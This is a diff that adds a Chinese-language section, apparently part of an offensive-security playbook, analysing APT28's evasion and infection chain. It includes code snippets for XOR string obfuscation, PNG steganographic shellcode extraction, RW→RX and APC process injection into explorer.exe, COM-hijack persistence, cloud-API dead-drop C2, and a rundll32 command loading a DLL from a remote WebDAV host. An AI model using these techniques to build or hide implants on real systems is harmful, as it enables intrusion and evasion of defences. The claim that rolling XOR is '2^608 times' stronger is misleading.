@@ -951,6 +951,161 @@ import "net/http"
 
 ---
 
+## 十四点五、APT28 Operation Neusploit — 国家级APT免杀对抗深度分析
+
+APT28 (Fancy Bear/UAC-0001)在2026年针对欧洲军事/政府目标的CVE-2026-21509利用行动中，展现了多层递进的免杀对抗技术。以下从代码级别分析其核心原理。
+
+### 1. 交替字节XOR + Null填充 — 字符串混淆
+
+**原理**: 真实字符和垃圾字节交替排列，打破strings/YARA对连续字符串的匹配。
+
+\`\`\`
+原始: "cmd.exe"
+编码: [c][0x00][m][0x00][d][0x00][.][0x00][e][0x00][x][0x00][e][0x00]
+     真实    垃圾    真实    垃圾    ...
+
+运行时解密:
+for (i = 0; i < len; i += 2) {
+    realByte = encrypted[i];        // 偶数位 = 真实字符
+    decrypted[j++] = realByte ^ 0x43;  // XOR解密，跳过奇数位
+}
+\`\`\`
+
+**APT28使用的密钥**:
+- XOR 0x43: 互斥量名称混淆
+- 多字节密钥: API名和路径字符串
+
+**为什么有效**: 静态分析工具看到的是乱码，只有运行时动态分配的内存中才出现明文。
+
+### 2. 76字节轮转XOR密钥 — 核心载荷解密
+
+**原理**: 76字节(608位)密钥进行轮转异或，比单字节XOR强2^608倍。
+
+\`\`\`
+// 密钥空间对比:
+单字节XOR: 2^8 = 256种可能 — 瞬间暴力破解
+76字节轮转: 2^(76*8) = 2^608 — 暴力破解不可能
+
+解密:
+for (i = 0; i < dataLen; i++) {
+    out[i] = encrypted[i] ^ key[i % 76];  // 轮转索引
+}
+\`\`\`
+
+**多层加密链**: XOR(0x43混淆字符串) → 76字节轮转XOR(载荷) → PNG隐写 → 最终XOR/RC4
+
+### 3. PNG隐写术 — IDAT LSB提取Shellcode
+
+**原理**: 将shellcode藏在PNG图片的像素数据最低有效位(LSB)中。
+
+\`\`\`
+APT28的PNG解码流程 (10个专用函数):
+1. 解析PNG签名 (8字节)
+2. 遍历Chunks:
+   - IHDR: 解析图片头(宽高/位深/颜色类型)
+   - PLTE: 提取调色板
+   - IDAT: 提取图像数据(zlib压缩的像素) → 解压 → LSB提取
+   - IEND: 图片结束
+
+LSB提取:
+for (i = 0; i < hiddenLen * 8; i++) {
+    lsb = pixelData[offset[i] % pixelLen] & 0x01;  // 取最低位
+    hidden[i / 8] |= (lsb << (7 - (i % 8)));
+}
+\`\`\`
+
+**完整解密链**: 加密PNG → 76字节XOR解密 → PNG解析(IDAT解压) → LSB提取 → 最终XOR/RC4 → shellcode
+
+### 4. RW→RX页面转换 — 避免RWX内存检测
+
+**原理**: 现代EDR对PAGE_EXECUTE_READWRITE(RWX)极其敏感。APT28使用两阶段权限。
+
+\`\`\`
+// APT28的做法:
+VirtualAllocEx(hProcess, 0, size, MEM_COMMIT, PAGE_READWRITE);  // RW
+WriteProcessMemory(hProcess, mem, shellcode, size, NULL);         // 写入
+VirtualProtectEx(hProcess, mem, size, PAGE_EXECUTE_READ, &old);   // → RX
+CreateRemoteThread(hProcess, 0, 0, mem, NULL, 0, NULL);           // 执行
+
+// 对比:
+RWX (危险): VirtualAlloc(..., PAGE_EXECUTE_READWRITE) — EDR高告警
+RW→RX (安全): 先RW写入，再RX执行 — 合法软件(JIT/动态链接器)也这样做
+\`\`\`
+
+### 5. APC注入 — QueueUserAPC替代CreateRemoteThread
+
+**原理**: 向目标进程现有线程的APC队列注入回调，而非创建新线程。
+
+\`\`\`
+// APT28的APC注入:
+// 1. 枚举explorer.exe的线程
+// 2. 对每个线程:
+QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, 0);
+
+// 优势:
+// - 不创建新线程 — EDR监控较少
+// - 在目标进程正常线程中执行 — 隐蔽
+// - 线程进入可告警等待状态时自动触发 — explorer.exe经常等待
+
+// 对比:
+CreateRemoteThread: 创建新线程 → EDR重点监控 → 高告警
+QueueUserAPC: 复用现有线程 → EDR监控较少 → 低告警
+\`\`\`
+
+### 6. COM劫持持久化 — InprocServer32
+
+**原理**: 修改注册表将合法CLSID的DLL路径替换为后门DLL。
+
+\`\`\`
+HKCU\\Software\\Classes\\CLSID\\{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}\\InprocServer32
+  修改前: C:\\Windows\\System32\\legit.dll
+  修改后: C:\\Users\\Public\\伪装名.dll
+
+触发: 系统/合法应用创建该COM对象 → 加载后门DLL → DllMain执行
+优势: 不修改Run键、HKCU权限即可、加载到合法进程
+\`\`\`
+
+### 7. Dead Drop Resolver — 合法云API作为C2
+
+**原理**: 使用filen.io(合法云盘)官方API进行C2通信，而非自建C2服务器。
+
+\`\`\`
+植入物 → HTTPS → api.filen.io/v1/file/list (看起来像正常云盘同步)
+攻击者 → 在filen.io共享目录放置指令 → 隐藏在文件中
+植入物 → 下载解析 → 提取指令 → 执行 → 上传结果
+
+优势: 合法域名不被封锁、HTTPS加密、流量正常、无固定C2基础设施
+\`\`\`
+
+### 8. WebDAV UNC路径 — DLL无落地执行
+
+**原理**: 通过UNC路径从WebDAV服务器直接加载DLL到内存，不写磁盘。
+
+\`\`\`
+rundll32.exe \\\\104.168.x.x\\webdav\\SimpleLoader.dll,EntryPoint
+
+流程: RTF → COM对象 → UNC路径 → WebClient服务 → WebDAV请求 → DLL内存加载 → 执行
+优势: 无文件落地、合法进程(rundll32)、系统服务级别(WebClient)
+\`\`\`
+
+### APT28完整感染链
+
+\`\`\`
+RTF文档 → CVE-2026-21509 → Shell.Explorer.1 COM → UNC路径
+  → WebDAV拉取: payload.lnk + SimpleLoader.dll (无落地)
+  → SimpleLoader: CreateMutexW(XOR 0x43混淆)
+    → 交替字节XOR解密字符串
+    → VirtualAlloc(RW) + 76字节轮转XOR解密载荷
+    → PNG解码(10函数) + LSB提取shellcode
+    → 最终XOR/RC4 → shellcode
+  → 进程注入: explorer.exe + VirtualAllocEx(RW) + WriteProcessMemory
+    → VirtualProtectEx(RX) + QueueUserAPC
+  → C2: CovenantGrunt .NET → HTTPS → filen.io API (Dead Drop)
+  → 持久化: COM劫持 InprocServer32注册表
+\`\`\`
+
+---
+
 ## 十五、攻击链组合公式 (Attack Chain Recipes)
 
 ### 链 1：信息泄露 → 凭证 → Shell
